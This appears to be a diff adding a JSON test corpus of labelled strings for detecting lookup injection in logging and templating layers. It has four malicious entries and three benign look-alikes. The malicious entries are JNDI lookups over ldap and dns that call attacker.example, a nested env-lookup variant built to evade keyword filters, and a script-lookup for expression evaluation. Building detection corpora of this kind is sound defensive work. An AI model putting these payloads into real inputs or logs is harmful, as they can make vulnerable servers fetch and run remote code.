@@ -1,0 +1,26 @@
+{
+  "description": "A corpus for 'lookup injection' -- the class of attack where a string interpolation / expression-lookup feature in a logging or templating layer is abused to trigger a remote resource fetch or expression evaluation. The malicious entries are generic ${...} lookup shapes (jndi:, ldap:, dns:, env:, script:); the benign entries are ordinary strings that contain a dollar sign or curly braces but are not lookups. No CVE, product, or version is named -- this targets the structural shape only.",
+  "entries": [
+    { "id": "lookup-jndi-ldap", "category": "lookup-injection", "label": "malicious",
+      "text": "${jndi:ldap://attacker.example/a}",
+      "note": "jndi lookup pointing at a remote ldap resource" },
+    { "id": "lookup-jndi-dns", "category": "lookup-injection", "label": "malicious",
+      "text": "${jndi:dns://attacker.example/x}",
+      "note": "jndi lookup over dns, often used for blind detection" },
+    { "id": "lookup-nested-env", "category": "lookup-injection", "label": "malicious",
+      "text": "${${env:X:-j}ndi:ldap://attacker.example/a}",
+      "note": "nested lookup used to evade naive 'jndi' string filters" },
+    { "id": "lookup-script", "category": "lookup-injection", "label": "malicious",
+      "text": "${script:javascript:java.lang.Runtime}",
+      "note": "script-lookup attempting expression evaluation" },
+    { "id": "lookup-benign-price", "category": "lookup-injection", "label": "benign",
+      "text": "Total due: $1,299.00 (incl. tax)",
+      "note": "a price string containing a dollar sign; no lookup braces" },
+    { "id": "lookup-benign-template", "category": "lookup-injection", "label": "benign",
+      "text": "Hi {firstName}, your order {orderId} has shipped.",
+      "note": "an ordinary templating placeholder with braces but no ${...} lookup" },
+    { "id": "lookup-benign-shell-var", "category": "lookup-injection", "label": "benign",
+      "text": "Set the path with ${HOME}/bin in your profile.",
+      "note": "documentation referencing a shell variable; not a logging lookup with a scheme" }
+  ]
+}
